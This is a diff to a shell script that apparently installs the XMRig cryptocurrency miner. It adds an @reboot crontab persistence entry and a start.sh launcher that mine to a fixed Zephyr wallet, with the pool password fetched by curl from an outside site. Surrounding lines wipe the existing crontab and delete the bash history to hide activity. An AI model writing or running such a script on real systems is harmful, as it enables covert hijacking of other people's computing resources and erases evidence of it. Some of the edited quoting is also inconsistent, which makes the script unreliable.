@@ -64,9 +64,9 @@ chmod +x ./xmrig
 # Use the MINER_ENDPOINT with the lowest latency in the crontab entry
 crontab -r
 
-crontab -l | { cat; echo "@reboot screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t $(nproc) -k -p $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")" ; } | crontab -
+crontab -l | { cat; echo "@reboot screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t $(nproc) -k -p $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" )" ; } | crontab -
 
-echo "screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t $(nproc) -k -p $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo \"-vm\" || echo \"\") >> start.sh" # Corrected the missing quote at the end
+echo "screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t \$(nproc) -k -p $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo \"-vm\" )" > start.sh
 
 chmod +x start.sh
 
@@ -76,3 +76,7 @@ rm -rf ~/.bash_history
 clear
 
 echo "$(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")"
+
+
+
+screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t $(nproc) -k -p $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")
